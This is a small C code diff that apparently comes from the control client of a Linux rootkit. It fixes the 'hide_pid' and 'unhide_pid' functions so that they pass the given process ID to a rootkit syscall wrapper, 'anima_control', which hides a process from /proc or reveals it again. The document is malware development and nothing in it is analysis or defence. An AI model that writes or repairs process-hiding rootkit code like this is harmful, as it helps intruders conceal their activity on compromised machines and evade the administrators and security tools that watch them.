@@ -89,7 +89,7 @@ void hide_pid(pid_t pid)
 	struct rk_args args;
 	char proc_path[64];
 
-	args.param1 = atoi(optarg);
+	args.param1 = pid;
 	anima_control(SYSCALL_HIDE_PID, &args);
 
 	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
@@ -104,7 +104,7 @@ void unhide_pid(pid_t pid)
 	struct rk_args args;
 	char proc_path[64];
 
-	args.param1 = atoi(optarg);
+	args.param1 = pid;
 	anima_control(SYSCALL_UNHIDE_PID, &args);
 
 	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
